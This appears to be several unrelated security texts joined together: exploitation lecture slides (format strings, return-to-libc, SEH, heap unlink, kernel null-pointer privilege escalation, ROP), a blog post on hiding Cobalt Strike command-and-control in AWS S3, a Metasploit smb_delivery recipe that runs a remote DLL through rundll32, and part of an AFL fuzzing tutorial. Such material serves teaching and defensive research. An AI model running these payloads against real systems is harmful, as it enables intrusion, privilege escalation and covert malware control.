mistakes.\nThis is correct:\nprintf(\"%s\", argv[1]);\nThis is incorrect:\nprintf(argv[1]);\n#include <stdio.h>\nvoid main(int argc, char *argv[]){\nprintf(\"%s\", argv[1]);\n}\n\fFormat String Vulnerabilities\nBut they both seem to work?\nYes! It will work which makes it difficult to detect.\n.\/correct \"Hello123\"\nOutput: Hello123\n.\/incorrect \"Hello123\"\nOutput: Hello123\n\fFormat String Vulnerabilities\nLets try inputting format string specifiers\n.\/correct \"%x\"\nOutput: %x\n.\/incorrect \"%x\"\nOutput: 12ffb8\n\fFormat String Vulnerabilities\nLets take another look at what format string specifiers can do.\n%x - Pop data off the stack and display it\n%s - Dereference pointer seen above and read to null byte value\n%n - Dereference counter location and write the functions\noutput count to address\n%x - Read from stack\n%s - Read from memory\n%n - Write to memory\n\fFormat String Vulnerabilities\nExploiting the vulnerability\n.\/incorrect \"AAAA %x %x %x %x %x\"\nOutput: AAAA 12ffb89a 12f376 77648426 41414141\n\fReturn to LibC\n\fReturn to LibC (Linux)\n\"Smash the stack\" attacks have been made more difficult by a\ntechnology called a non-executable stack.\nNX stack can still be bypassed.\nA buffer overflow is still required but the data on the stack is\nnot executable shellcode, it contains read-only arguments to a\nfunction.\nLibC is a dynamic library that is part of every userspace\napplication on a linux system. This library contains all sorts of\nfunctions such as system() to launch an application.\n\fReturn to LibC (Linux)\nNow we can\nspawn a shell\nsystem(\"\/bin\/bash wget ...\");\n[arguments]\n[arguments]\n[stack return\naddress]\nParameters\nLocal Variables\nReturn Address\nParameters\nFrame\nfor f()\nFrame\nfor e()\nsystem()\nin LibC\n\fReturn to Structured\nException Handler (SEH)\n\fReturn to SEH (Windows)\nStack cookies are numbers that are placed before the return\naddress when a function begins, and checked before the\nfunction returns. This prevents buffer overflow attacks.\n[buffer][cookie][saved EBP][saved EIP]\n\fIf the overwritten cookie does not match with the original\ncookie, the code checks to see if there is a developer defined\nexception handler. If not, the OS exception handler will kick in.\n[buffer][cookie][SEH record][saved ebp][saved eip]\n(1.) - Overwrite an Exception Handler registration structure\n(2.) - Trigger an exception before the cookie is checked\n(3.) - Return to overwritten Exception Handler\nReturn to SEH (Windows)\n\fReturn to Heap\n\fHeap spraying is an unreliable method of increasing the\nchances of returning to executable instructions in a buffer\noverflow attack.\nAttackers create thousands of data structures in memory which\ncontain mostly null operations (the 0x90 instruction) with the\nexecutable machine instructions at the end of the structure.\nStatistically the chances of returning to a valid location on a\n\"NOP sled\" are increased by increasing the size of the data\nstructures. Sometimes the chance can be up to 50%.\nReturn to Heap (Heap Spraying)\n\fHeap Overflows\n\funlink() Technique by w00w00\nThe Bin structure in the .bss segment stores unused memory\nchunks in a doubly linked list. The chunks contain forward\npointers and backward pointers.\n16 24 32 ... 512 576 640\n\funlink() Technique by w00w00\nWhen memory is allocated, the pointers of the previous and\nnext block are re-written using the unlink() function by de-\nreferencing the pointers in the middle block.\n#define unlink( P, BK, FD ) {\nBK = P->bk;\nFD = P->fd;\nFD->bk = BK;\nBK->fd = FD;\n}\n\fHow a normal unlink() works.\nStep 1:\nunlink() Technique by w00w00\n\funlink() Technique by w00w00\nHow a normal unlink() works.\nStep 2:\n\funlink() Technique by w00w00\nWhen a heap management operation (such as free \/ malloc \/\nunlink) is made, pointers in the chunk headers are\ndereferenced.\nWe want to target the unlink() macro (a deprecated version of\nthe Doug Lea memory allocator algorithm).\n\fHeap overflows work by overflowing areas of heap memory and\noverwriting the headers of the next area in memory.\nIf the first chunk contains a buffer, then we can overwrite the\nheaders in the next chunk which is unallocated.\nunlink() Technique by w00w00\nAAAAAA\nAAAAAA\nAAAAAA\n\funlink() Technique by w00w00\nBy altering these pointers we can write to arbitrary addresses\nin memory. Dereferencing is confusing!\nUnlink has 2 write operations. By overwriting the header of a\nchunk, we can choose what we write to memory!\n[fwd-ptr] = bk-ptr\nand\n[bk-ptr] = fwd-ptr\nTry overwriting pointers in the Global Offset Table.\n\fWe can force unlink() to write to the GOT, and write to the\nshellcode chunk.\nunlink() Technique by w00w00\nInstructions\nGOT i-ptr\ninstructions-pointer\nis written\nsomewhere on the\nGlobal Offset Table\nGOT\n\funlink() Technique by w00w00\nThe memory pointed to by fd+12 is overwritten with bk, then\nthe memory pointed to by bk+8 is overwritten with the value of\nfd.\nunlink() overwrites the GOT with the shellcode's address in the\nfirst step. This was the primary goal of the exploit.\nThe second step writes a pointer just past the start of the\nshellcode. This would normally render the shellcode\nunrunnable, but the shellcode can be made to start with a\njump instruction, skipping over the part of the shellcode that is\noverwritten during unlinking.\n\fInteger Overflows\n\fInteger Overflows\nPrimitive Data Types\n8 bits: maximum representable value 2^8\u22121 = 255\n16 bits: maximum representable value 2^16\u22121 = 65,535\nIn order to represent a negative value, a bit must be removed\nfrom the byte and used as a flag to indicate whether the value\nis positive or negative.\n\fInteger Overflows\nSigned 16 bit integer\n\u221232,768 to 32,767\n0111 1111 1111 1111 = 32,767\n+1\n1000 0000 0000 0000 = -0 or 32,768\n+1\n1000 0000 0000 0001 = -1 or 32,769\n+1\n1000 0000 0000 0010 = -2 or 32,770\n\fInteger Overflows\nSome programs may make the assumption that a number always\ncontains a positive value. If the number has a signature bit at\nthe beginning, an overflow can cause its value to become\nnegative.\nAn overflow may violate the program's assumption and may\nlead to unintended behavior.\n\fNull Pointers\n\fNull Pointers\nEach application has its own address space, with which it is\nfree to do with it as it wants.\nNULL can be a valid virtual address in your application using\nmmap().\nuser land - uses virtual addresses\nkernel land - uses physical addresses\n\fNull Pointers\nAddress space switching expensive so the kernel just runs in the\naddress space of whichever process was last executing.\nAt any moment, the processor knows whether it is executing\ncode in user mode or in kernel mode.\nPages in virtual memory have flags on it that specifies whether\nor not user code is allowed to access it.\n\fNull Pointers\nFind kernel code that is initialized to NULL\nstruct my_ops {\nssize_t (*do_it)(void);\n};\nstatic struct my_ops *ops = NULL;\nThis structure must be executed by the kernel\nreturn ops->do_it();\n\fNull Pointers\nDisable OS security\necho 0 > \/proc\/sys\/vm\/mmap_min_addr\nIn your userland application you must declare code that is to be\nexecuted with kernel privileges\nvoid get_root(void) {\ncommit_creds(prepare_kernel_cred(0));\n}\nMap a page at zero virtual address\nmmap(0, 4096, PROT_READ | PROT_WRITE , MAP_PRIVATE |\nMAP_ANONYMOUS | MAP_FIXED , -1 , 0);\n\fNull Pointers\nImmediately Declare a pointer at null\nvoid (**fn)(void) = NULL;\nSet the address of our malicious userspace code as the value of\nour pointer\n*fn = get_root;\nFinally trigger the vulnerable kernel function that executes the\nstructure. This is usually a syscall such as read(), write() etc...\n\fNull Pointers\nThis works for 2 reasons:\n(1.) - Since the kernel runs in the address space of a userspace\nprocess, we can map a page at NULL and control what data a\nNULL pointer dereference in the kernel sees, just like we could\nfor our own process!\n(2.) - To get code executing in kernel mode, we don't need to\ndo any trickery to get at the kernel's data structures. They're\nall there in our address space, protected only by the fact that\nwe're not normally able to run code in kernel mode.\n\fNull Pointers\nWhen the CPU is in user mode, translations are only effective\nfor the userspace region of memory, thus protecting the kernel\nfrom user programs.\nWhen in kernel mode, translations are effective for both\nuserspace and kernelspace regions, thus giving the kernel easy\naccess to userspace memory, it just uses the process' own\nmappings.\nWithout any exploit, just triggering the syscall would cause a\ncrash.\n\fReturn Oriented\nProgramming Chains\n(ROP)\n\fROP Chains\nROP chains are chains of short instruction sequences followed\nby a return instruction. These short sequences are called\ngadgets. Each gadget returns to the next gadget without ever\nexecuting a single bit from our non-executable shellcode. ROP\nchains enable attackers to bypass DEP and ASLR.\nSince we cannot execute our own code on the stack, the only\nthing we can do is call existing functions. To access these\nexisting functions using buffer overflow, we require at least\none non-ASLR module to be loaded.\n\fROP Chains\nScan executable memory regions of libraries using automated\ntools to find useful instruction sequences followed by a return.\nExisting functions will provide us with some options:\n(1.) - execute commands (classic \"ret-to-libc\")\n(2.) - mark memory as executable\nA single gadget could look like this:\nPOP EAX\nRET\n\fROP Chains\nA single gadget would just\ncontinue to follow a path of\nexecution that is being stored\nin the stack.\nThis means we only control\nthe instruction pointer for 2\ninstructions.\nWe have to select a gadget\nthat can alter multiple frames.\n[AAAA][AAAA]\n[AAAA][AAAA]\n[AAAA][stack\nreturn address]\nParameters\nLocal Variables\nReturn Address\nParameters\nFrame\nfor f()\nFrame\nfor e()\nROP\nGadget\n\fROP Chains\nUsing a stack pivot, the ESP register (stack pointer) is loaded\nwith the address to our own data so that input data is re-\naligned and can be interpreted as return addresses and\narguments to the called functions. Pivots basically enables us\nto use a forged stack.\nSample ROP exploit:\n(1.) - Start the ROP chain\n(2.) - Use a gadget pivot to the stack pointer to buffer\n(3.) - Return to fake stack, and launch more gadgets\n(4.) - Use gadgets to set up stack\/registers\n(5.) - Use gadgets to disable DEP\/ASLR\n(6.) - Return to shellcode and execute\n\fFin\n\fQuestions\nQuestions\n\fReferences\nSEH Exploit\nhttps:\/\/www.corelan.be\/index.php\/2009\/09\/21\/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr\/\nHeap Overflow\nhttp:\/\/www.thehackerslibrary.com\/?p=872\nhttp:\/\/etutorials.org\/Networking\/network+security+assessment\/Chapter+13.+Application-Level+Risks\/13.5+Heap+Overflows\/\nhttp:\/\/geekscomputer.blogspot.com\/2008\/12\/buffer-overflows.html\nhttp:\/\/drdeath.myftp.org:881\/books\/Exploiting\/Understanding.Heap.Overflow.Exploits.pdf\nhttps:\/\/rstforums.com\/forum\/62318-run-time-detection-heap-based-overflows.rst\nhttp:\/\/www.phrack.org\/archives\/57\/p57_0x08_Vudo%20malloc%20tricks_by_MaXX.txt\nhttp:\/\/www.cgsecurity.org\/exploit\/heaptut.txt\nhttp:\/\/www.sans.edu\/student-files\/presentations\/heap_overflows_notes.pdf\nNull Dereference Exploits\nhttp:\/\/www.computerworld.com.au\/article\/212804\/null_pointer_exploit_excites_researchers\/\nhttp:\/\/blog.cr0.org\/2009\/06\/bypassing-linux-null-pointer.html\nhttps:\/\/blogs.oracle.com\/ksplice\/entry\/much_ado_about_null_exploiting1\nhttp:\/\/blog.mobiledefense.com\/2012\/11\/analysis-of-null-pointer-dereference-in-the-android-kernel\/\nhttp:\/\/lwn.net\/Articles\/342330\/\nhttp:\/\/lwn.net\/Articles\/75174\/\nhttp:\/\/duartes.org\/gustavo\/blog\/post\/anatomy-of-a-program-in-memory\nhttp:\/\/blog.mobiledefense.com\/2012\/11\/analysis-of-null-pointer-dereference-in-the-android-kernel\/\nROP Chains\nhttps:\/\/www.corelan.be\/index.php\/2010\/06\/16\/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube\/\nhttps:\/\/www.corelan.be\/index.php\/2009\/09\/21\/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr\/\nhttp:\/\/www.exploit-db.com\/wp-content\/themes\/exploit\/docs\/17914.pdf\nhttp:\/\/trailofbits.files.wordpress.com\/2010\/04\/practical-rop.pdf\nhttp:\/\/www.exploit-monday.com\/2011\/11\/man-vs-rop-overcoming-adversity-one.html\nhttps:\/\/www.corelan.be\/index.php\/2011\/12\/31\/exploit-writing-tutorial-part-11-heap-spraying-demystified\/\nhttp:\/\/neilscomputerblog.blogspot.ie\/2012\/06\/stack-pivoting.html\n\f"}
{"text":"[1]Rhino Security Labs\n[2](888) 944-8679\n* [3]Contact Us\n* [4]Get a quote\n* [5]Assessments\n+ [6]Application and Network\no [7]Web Application Penetration Testing\no [8]Network Penetration Testing\no [9]Mobile App Penetration Testing\n+ [10]Cloud Penetration Testing\no [11]AWS Penetration Testing\no [12]GCP Penetration Testing\no [13]Azure Penetration Testing\n+ [14]Adversary Simulation\no [15]Red Team Assessments\no [16]Email Spear Phishing\no [17]Vishing (Voice Call) Testing\n* [18]Industries\n+ [19]Technology\n+ [20]Healthcare\n+ [21]Financial\n+ [22]Retail\n* [23]Resources\n+ [24]Security Blog\no [25]Penetration Testing AWS Environments\no [26]EasyMP Zeroday Disclosure\n+ [27]Downloads\no [28]Ebook: Questions For Every Pentest Vendor\no [29]Example Pentest Report\no [30]Penetration Testing FAQ\n+ [31]Security Research\no [32]Research and Tool Development\no [33]Vulnerability Disclosure\n* [34]Security Blog\n* [35]Company\n+ [36]About Us\n+ [37]Leadership\n+ [38]Careers\n+ [39]Company Principles\n* [40]Assessments\n[41]Application and Network\n+ [42]Web Application Penetration Testing\n+ [43]Network Penetration Testing\n+ [44]Mobile App Penetration Testing\n[45]Cloud Penetration Testing\n+ [46]AWS Penetration Testing\n+ [47]GCP Penetration Testing\n+ [48]Azure Penetration Testing\n[49]Adversary Simulation\n+ [50]Red Team Assessments\n+ [51]Email Spear Phishing\n+ [52]Vishing (Voice Call) Testing\n* [53]Industries\n+ [54]Technology\n+ [55]Healthcare\n+ [56]Financial\n+ [57]Retail\n* [58]Resources\n[59]Security Blog\n+ [60]Penetration Testing AWS Environments\n+ [61]EasyMP Zeroday Disclosure\n[62]Downloads\n+ [63]Ebook: Questions For Every Pentest Vendor\n+ [64]Example Pentest Report\n+ [65]Penetration Testing FAQ\n[66]Security Research\n+ [67]Research and Tool Development\n+ [68]Vulnerability Disclosure\n* [69]Security Blog\n* [70]Company\n+ [71]About Us\n+ [72]Leadership\n+ [73]Careers\n+ [74]Company Principles\n[75]Technical Blog\n[76]AWS\naws security malware\nHiding in the Cloud:\nCobalt Strike Beacon C2 using Amazon APIs\nBenjamin Caudill\nIntro: Malware C2 with Amazon Web Services\nResearchers at Rhino Security Labs have developed a way to use Amazon\u2019s\nAWS APIs for scalable malware Command and Control (C2), subverting a\nrange of traditional blocking and monitoring techniques. By leveraging\nthe Cobalt Strike \u201cExternalC2\u201d specs, we\u2019ve established a reliable\nmalware channel which communicates only on a trusted cloud source\u2013the\nAmazon AWS APIs themselves.\nMalware Background: Why AWS API\u2019s for C2?\nBefore we dive into the details, let\u2019s break down why this type of\nattack is so effective against traditional security capabilities.\nWhile malware historically has used a range of protocols \u2013 such as DNS,\nFTP, HTTP and others \u2013 developments in packet analysis and protocol\nrestriction has left HTTPS as the primary protocol for malware\ncommunication.\nDepending on the sophistication, there are only a couple of popular\nstrategies still effective today:\n1 \u2013 Malicious Domain(s)\nA large majority of samples simply have a malicious domain (or set of\ndomains) the owners control \u2013 either by purchasing or compromising them\n\u2013 and reach out to those domains for exclusive communication. In\ntheory, this is easy to detect as DNS logs, proxy logs, and other\ncommon IR data sources can identify communication to a previously\nunknown domain. DNS categorization and other tools can help facilitate\nthis basic hunting.\n2 \u2013 Trusted Cloud Service\nA more advanced approach is to leverage trusted cloud services for C2,\nsuch as Facebook, Dropbox, Gmail, etc. This is effective because most\nnetwork security tools will only identify the destination of the\ntraffic. Since HTTPS is enabled and further packet analysis is\nimpossible without SSL-decryption at the web proxy, the traffic is\nallowed. Generally, we find this approach is successful, but a cloud\nservice accepted in one organization may be cause for investigation in\nanother. One such way to leverage these trusted providers is through\nthe use of [77]Domain Fronting, a technique where attackers can use\ntrusted domains as redirectors to the command and control server by\nspecifying a specific Host header. While this technique is extremely\nvaluable, if a blue team uses SSL decryption at the web proxy, they may\nnotice anomalous traffic being exchanged at the packet level.\nSophisticated attackers work around this by creating communication\nchannels that use the legitimate functionality of a trusted cloud\nservice for their communication channel, surviving high-level packet\nintrospection.\nAn example of abusing a trusted Cloud provider would be using Google\nDrive as a communication channel. While we found this to be very\neffective in communicating in organizations with Google Suite, that\u2019s\nnot a universal need and drew the attention of blue teams when used in\nthe wrong environment. Simply put, if Box.net is the only cloud storage\nthat\u2019s approved, domain requests to competing APIs are simply a data\nleakage threat and should be investigated.\nTo summarize, blue teams have a variety of techniques at their disposal\nto block and detect malware, including:\n\u2022 Log, Categorize and Block DNS (including previously new or\nuncategorized domains)\n\u2022 Block specific cloud-hosting\/cloud-service domains that are not used\nas part of the enterprise infrastructure (eg: Dropbox, Gmail, Github,\netc)\n\u2022 Monitor for and block connections to previously-unknown domains or\nIPs\n\u2022 Proactively utilize threat intel feeds and aggregate the insight of\nmultiple organizations to create a more comprehensive picture of\ncurrent and likely threats\n\u2022 Automate these activities for greater speed in shutting down a\nsuspected attack\nBy utilizing AWS API services \u2013 particularly S3 buckets \u2013 as the C2\nsource, we can be assured the domain will be live in all environments\nand subvert the prevention\/detection techniques listed above.\nCobalt Strike and the External C2 Specification\nFor those unfamiliar, Cobalt Strike (CS) is a commercial malware\nplatform used by both red teams and threat actors alike. Essentially CS\nhas two components: Beacon and Team Server. The Beacon is malicious\ncode that runs on a victim\u2019s machine that is responsible for setting up\ncommunications with Team Server to receive and execute further\ncommands. The Team Server is responsible for administering each Beacon\nthat calls home for further commands from the operator.\nRecently Raphael Mudge (@armitagehacker), the creator of Cobalt Strike,\nreleased the [78]specification for abstracting these external\ncommunication channels and implementing them in your own operations.\nDoing so reduces red team infrastructure overhead by reducing to zero\nthe number of malicious domains and servers required to redirect to\nyour Team Server.\nAbstracting the Specification Using Frameworks\nThe greater security community took the external C2 specification and\nran with it, creating frameworks to wrap the work by Raphael Mudge. The\nframework we highlight in this post is Jonathon Echavarria\u2019s\n(@Und3rf10w) external_c2_framework\n([79]https:\/\/github.com\/Und3rf10w\/external_c2_framework). This\nframework was chosen for two reasons:\n1. Modularity. The framework was designed such that adding modules is\nstraightforward and requires little tinkering. The external\nspecification is broken into an encoding and transport mechanism,\nmaking the implementation straightforward.\n2. Python. The entire framework is built in Python. Python is a\nstraightforward, easy language that interfaces with a wide variety of\nexternal services easily.\nThe only functionality missing from Echavarria\u2019s framework was\nmulti-client support. At the time of this article, the framework only\nsupported one Beacon to one Team Server. With our fork of this\nrepository, we expand this capability and enable for support multiple\nBeacons on the Team Server.\nImplementation Using Amazon Web Services API\nUnd3rf10w\u2019s implementation is broken up into encoding and transport\nmechanisms. The encoding module is used to encode the data in transit\nbetween the Beacon and the Team Server. This could be encryption or as\nsimple as base64 encoding, which this example uses. The transport\nmodule is the way the Beacon and the Team Server communicate with each\nother using the external channel.\nThe method of transport we use here is through Amazon Web Services\n(AWS) API. This was chosen for a few reasons:\n1. AWS API is implemented easily and succinctly in python using the\nBoto library.\n2. Developers and DevOps teams alike automate infrastructure and\nbackups using AWS, meaning traffic from these addresses would blend in\nwith regular workflow.\n3. AWS supports a data-rich object, S3 Objects, which we\u2019ll use to\nuniquely identify agents and transmit data of arbitrary length and\ncontent.\nOverview of AWS S3 Buckets as a Communication Channel\nThe way both Beacon and the Team Server communicate with each other is\nthrough the AWS APIs by creating and deleting objects in S3. When the\ncustom Beacon generated by the framework executes on the victim (or\nclient) machine, it registers itself in S3 by creating an object with a\nunique staging key. This key is comprised of two parts \u2013 a static\nprefix that notifies the Team Server the Beacon is ready to be staged\nand receive the full payload, and a unique identifier that the\nunderlying external C2 server can use to identify commands that need to\nbe sent to the Beacon.\nThe External C2 Server is responsible for translating data between your\nexternal communication channel, in this case the AWS API, and the Team\nServer itself. The External C2 Server will poll the S3 Bucket for the\nstaging key and extract the agent\u2019s unique identifier. It then forwards\nthe request up to the Team Server to receive the full payload to\nexecute on the client.\nTo notify the client that a new task is ready for it to execute the\nExternal C2 Server creates a new object in S3. This object\u2019s key is\ncomprised of the Beacon\u2019s unique ID generated from above and a static\nsuffix, \u2018TaskForYou\u2019. The contents of this object contain the encoded\ncommand (encoded by the encoding module) for the Beacon to execute.\nAfter initial registration, the Beacon code will periodically poll for\ntasks from S3 looking for the task key corresponding to itself. It will\nthen download and delete the object, decode the contents and execute\nthe command. Once executed, it will encode the output of the command\nand create a new object in S3 with the response key and the encoded\nresults. The External C2 Server then polls until it receives a response\nfrom the agent, pulls and deletes the object, and sends the results up\nto the Team Server.\nBelow is a diagram elaborating on the process:\nAWS C2 Malware Beacon\nShortfalls of AWS as a C2 Channel\nWhen considering this method, it is evident that this is by no means a\nperfect transport module. One shortfall is that to push and pull from\nS3, you need to distribute your API keys to the Beacon executable. In\nthis proof of concept these are hard coded; however, there are other\nways to distribute these keys. One such method could be encrypting the\nAWS credentials using a transient key and publishing the encrypted\ncredentials and transient keys on separate remote resources. Then, when\nthe Beacon executes, it could fetch both the transient key and\nencrypted credentials, decrypt the credentials and begin the staging\nprocess.\nFurther, while we tackled the problem of multi-client beacon\nfunctionality it still lacks task sequencing. Without this the client\ncan only receive one command and submit one response at a time.\nThe other pitfall of this technique is latency. Both client and server\ncommunicate with the external resource via polling, which means that\nthe client will continually beacon out to the external resource looking\nfor tasks. The polling rate of the Beacon will be predefined and\nimmutable after compilation of the client executable. At the time of\nwriting it is still unclear how to resolve this issue.\nDemonstrating the Attack: Proof of Concept\nTo summarize everything, below is a short video demo of how to\nimplement the framework on your own Team Server. In it, we demonstrate\nspinning up the Team Server and External C2, client execution of the\npayload, and finally that the beacons are not polling back to our Team\nServer directly by invoking netstat -a.\nNote: The Team Server itself is not using any redirectors, so the\nnetstat invocation here is a good proof positive.\nFor the fork of external_c2_framework, along with the AWS S3 transport\nmodule, see our Github:\n[80]https:\/\/github.com\/RhinoSecurityLabs\/external_c2_framework\n```\nIFRAME: [81]https:\/\/www.youtube.com\/embed\/wzruD7LPZp0\n```\nConclusion: Improving Security Defenses\nWhile this article demonstrates bypassing several network security\ntools, that doesn\u2019t mean they don\u2019t have value. Defense in depth\nrequires hunting for anomalous traffic in several ways, knowing that\nany one source will not always be effective. Be aware of your own\nnetwork topology and communication habits.  Further, several host-based\nprotections exist to thwart many of these threats before they even\nbegin. Correlating processes with their associated communications, the\ncreation execution of unsigned code and unusual process trees can be\nclear indicators of malicious activity. While this is by no means an\nexhaustive list, they provide a good foundation to begin threat\nhunting.\nReferences:\nDomain Fronting:\n\u2022\n[82]https:\/\/blog.cobaltstrike.com\/2017\/02\/06\/high-reputation-redirector\ns-and-domain-fronting\/\n\u2022\n[83]https:\/\/www.cyberark.com\/threat-research-blog\/red-team-insights-htt\nps-domain-fronting-google-hosts-using-cobalt-strike\/\n\u2022\n[84]https:\/\/github.com\/bluscreenofjeff\/Red-Team-Infrastructure-Wiki#dom\nain-fronting\nExternal C2 Communications:\n[85]\u2022 https:\/\/www.cobaltstrike.com\/help-externalc2\n\u2022 [86]https:\/\/github.com\/Und3rf10w\/external_c2_framework\n\u2022\n[87]https:\/\/labs.mwrinfosecurity.com\/blog\/tasking-office-365-for-cobalt\n-strike-c2\nRelated Resources\nThe Retail Industry is home to some of the biggest and most consistent\nthreats; credit card theft.\nAWS Vulnerabilities and the Attacker\u2019s Perspective\nCloud Security Risks (P2): CSV Injection in AWS CloudTrail\nAWS Configurations\nAWS Identity Access Management (IAM): Preventing Common Security\nConfiguration Flaws\nInterested in more information?\n20603\n[88]Contact Us Today\n[hacking-1685092-1140x400.jpg]\n[89]Assessment Services\n* [90]Network Penetration Test\n* [91]Webapp Penetration Test\n* [92]AWS Cloud Penetration Testing\n* [93]GCP Cloud Penetration Testing\n* [94]Azure Penetration Testing\n* [95]Mobile App Assessment\n* [96]Secure Code Review\n* [97]Social Engineering \/ Phishing Testing\n* [98]Vishing (Voice Call) Testing\n* [99]Red Team Engagements\n[100]Industries\n* [101]Healthcare\n* [102]Finance\n* [103]Technology\n* [104]Retail\n[105]Resources\n* [106]Technical Blog\n* [107]Strategic Blog\n* [108]Example Pentest Report\n* [109]Technical Research\n* [110]Vulnerability Disclosures\n* [111]Disclosure Policy\n* [112]Penetration Testing FAQ\n* [113]Support: AWS Pentest Form\n*\n[114]Company\n* [115]Leadership\n* [116]Blog\n* [117]Careers\n* [118]Company Principles\n* [119]Contact Us\n* [120]Get a Quote\n* [121]RSS Feed\nAbout Us\nRhino Security Labs is a top penetration testing and security\nassessment firm, with a focus on cloud pentesting (AWS, GCP, Azure),\nnetwork pentesting, web application pentesting, and phishing.\nWith manual, deep-dive engagements, we identify security\nvulnerabilities which put clients at risk.\nEndorsed by industry leaders, Rhino Security Labs is a trusted security\nadvisor to the Fortune 500.\n[122]info@rhinosecuritylabs.com\n[123](888) 944-8679\nRhino Security Labs, Inc"}
{"text":"ON KALI:\nmsfconsole\nuse exploit\/windows\/smb\/smb_delivery\nset FILENAME 1.dll\nset FOLDER_NAME 2\nset SHARE 3\nexploit\n\nON WINDOWS:\nrundll32 \\\\172.16.217.130\\3\\2\\1.dll,0\n"}
{"text":"#[1]\u00bb Feed [2]\u00bb Comments Feed [3]alternate [4]alternate [5]search\n[6]WordPress.com\n[7]Skip to content\n* [8]Blog\n* [9]About FoxGlove Security\n* [10]The Team\n(BUTTON)\nPosted on [11]March 15, 2016March 15, 2016\nFuzzing workflows; a fuzz job from start to finish\nBy [12]@BrandonPrry\nMany people have garnered an interest in fuzzing in the recent years,\nwith easy-to-use frameworks like American Fuzzy Lop showing incredible\npromise and (relatively) low barrier to entry. Many websites on the\ninternet give brief introductions to specific features of AFL, how to\nstart fuzzing a given piece of software, but never what to do when you\ndecide to stop fuzzing (or how you decide in the first place?).\nIn this post, we\u2019d like to go over a fuzz job from start to finish.\nWhat does this mean exactly? First, even finding a good piece of\nsoftware to fuzz might seem daunting, but there is certain criteria\nthat you can follow that can help you decide what would be useful and\neasy to get started with on fuzzing. Once we have the software, what\u2019s\nthe best way to fuzz it? What about which testcases we should use to\nseed with? How do we know how well we are doing or what code paths we\nmight be missing in the target software?\nWe hope to cover all of this to give a fully-colored, 360 view of how\nto effectively and efficiently go through a full fuzz job process from\nstart to finish. For ease of use, we will focus on the AFL framework.\nWhat should I fuzz? Finding the right software\nAFL works best on C or C++ applications, so immediately this is a piece\nof criteria we should be looking for in software we would like to fuzz.\nThere are a few questions we can ask ourselves when looking for\nsoftware to fuzz.\n1. Is there example code readily available?\n+ Chances are, any utilities shipped with the project are too\nheavy-weight and can be trimmed down for fuzzing purposes. If\na project has bare-bones example code, this makes our lives as\nfuzzers much easier.\n2. Can I compile it myself? (Is the build system sane?)\n+ AFL works best when you are able to build the software from\nsource. It does support instrumenting black-box binaries on\nthe fly with QEMU, but this is out of scope and tends to have\npoor performance. In my ideal scenario, I can easily build the\nsoftware with afl-clang-fast or afl-clang-fast++.\n3. Are there easily available and unique testcases available?\n+ We are probably going to be fuzzing a file format (although\nwith some tuning, we can fuzz networked applications), and\nhaving some testcases to seed with that are unique and\ninteresting will give us a good start. If the project has unit\ntests with test cases of files (or keeps files with previously\nknown bugs for regression testing), this is a huge win as\nwell.\nThese basic questions will help save a lot of time and headaches later\nif you are just starting out.\nThe yaml-cpp project\nOk, but how do you find the software to ask these questions about? One\nfavorite place is Github, as you can easily search for projects that\nhave been recently updated and are written in C or C++. For instance,\nsearching Github for all C++ projects with more than 200 stars led us\nto a project that shows a lot of promise: yaml-cpp\n([13]https:\/\/github.com\/jbeder\/yaml-cpp). Let\u2019s take a look at it with\nour three questions and see how easily we can get this fuzzing.\n1. Can I compile it myself?\n+ yaml-cpp uses cmake as its build system. This looks great as\nwe can define which compilers we want to use, and there is a\ngood chance afl-clang-fast++ will Just Work\u2122. One interesting\nnote in the README of yaml-cpp is that it builds a static\nlibrary by default, which is perfect for us, as we want to\ngive AFL a statically compiled and instrumented binary to\nfuzz.\n2. Is there example code readily available?\n+ In the util folder in the root of the project\n([14]https:\/\/github.com\/jbeder\/yaml-cpp\/tree\/master\/util),\nthere are a few small cpp files, which are bare-bones\nutilities demonstrating certain features of the yaml-cpp\nlibrary. Of particular interest is the parse.cpp file. This\nparse.cpp file is perfect as it is already written to accept\ndata from stdin and we can easily adapt it to use AFL\u2019s\npersistent mode, which will give us a significant speed\nincrease.\n3. Are there easily available and unique\/interesting testcases\navailable?\n+ In the test folder in the root of the project is a file called\nspecexamples.h, which has a very good number of unique and\ninteresting YAML testcases, each of which seems to be\nexercising a specific piece of code in the yaml-cpp library.\nAgain, this is perfect for us as fuzzers to seed with.\nThis looks like it will be easy to get started with. Let\u2019s do it.\nStarting the fuzz job\nWe are not going to cover installing or setting up AFL, as we will\nassume that has already been done. We are also assuming that\nafl-clang-fast and afl-clang-fast++ have been built and installed as\nwell. While afl-g++ should work without issues (though you won\u2019t get to\nuse the awesome persistent mode), afl-clang-fast++ is certainly\npreferred. Let\u2019s grab the yaml-cpp codebase and build it with AFL.\n# git clone [15]https:\/\/github.com\/jbeder\/yaml-cpp.git\n# cd yaml-cpp\n# mkdir build\n# cd build\n# cmake -DCMAKE_CXX_COMPILER=afl-clang-fast++ ..\n# make\nOnce we know that everything builds successfully, we can make a few\nchanges to some of the source code so that AFL can get a bit more\nspeed. From the root of the project, in \/util\/parse.cpp, we can update\nthe main() function using an AFL trick for persistent mode.\nint main(int argc, char** argv) {\nParams p = ParseArgs(argc, argv);\nif (argc > 1) {\nstd::ifstream fin;\nfin.open(argv[1]);\nparse(fin);\n} else {\nparse(std::cin);\n}\nreturn 0;\n}\nWith this simple main() method, we can update the else clause of the if\nstatement to include a while loop and a special AFL function called\n__AFL_LOOP(), which allows AFL to basically perform the fuzzing of the\nbinary in process through some memory wizardry, as opposed to starting\nup a new process for every new testcase we want to test. Let\u2019s see what\nthat would look like.\nif (argc > 1) {\nstd::ifstream fin;\nfin.open(argv[1]);\nparse(fin);\n} else {\nwhile (__AFL_LOOP(1000)) {\nparse(std::cin);\n}\n}\nNote the new while loop in the else clause, where we pass 1000 to the\n__AFL_LOOP() function. This tells AFL to fuzz up to 1000 testcases in\nprocess before spinning up a new process to do the same. By specifying\na larger or smaller number, you may increase the number of executions\nat the expense of memory usage (or being at the mercy of memory leaks),\nand this can be highly tunable based on the application you are\nfuzzing. Adding this type of code to enable persistent mode also is not\nalways this easy. Some applications may not have an architecture that\nsupports easily adding a while loop due to resources spawned during\nstart up or other factors.\nLet\u2019s recompile now. Change back to the build directory in the yaml-cpp\nroot, and type \u2018make\u2019 to rebuild parse.cpp.\nTesting the binary\nWith the binary compiled, we can test it using a tool shipped with AFL\ncalled afl-showmap. The afl-showmap tool will run a given instrumented\nbinary 